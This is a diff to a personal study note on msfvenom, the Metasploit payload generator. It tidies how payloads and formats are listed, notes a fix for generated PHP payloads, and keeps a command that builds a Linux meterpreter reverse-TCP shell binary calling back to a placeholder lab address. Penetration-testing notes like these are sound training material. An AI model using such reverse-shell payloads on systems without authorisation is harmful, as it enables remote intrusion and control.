@@ -16,11 +16,10 @@ Important options:
 
 **list things** 
 possible payloads:`msfvenom --list payloads`
-possible formats: `--list payloads`
+possible formats: `--list formats`
 
-when generating PHP payload: the starting php tag is commented out delete the comment to make the payload valid
-
-info on listener in [[3 Tools/Metasploit framework/msfconsole]]
+> [!Hint]
+> when generating PHP payload: the starting php tag is commented out delete the comment to make the payload valid
 
 ## useful payload commands
 - linux elf: `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`
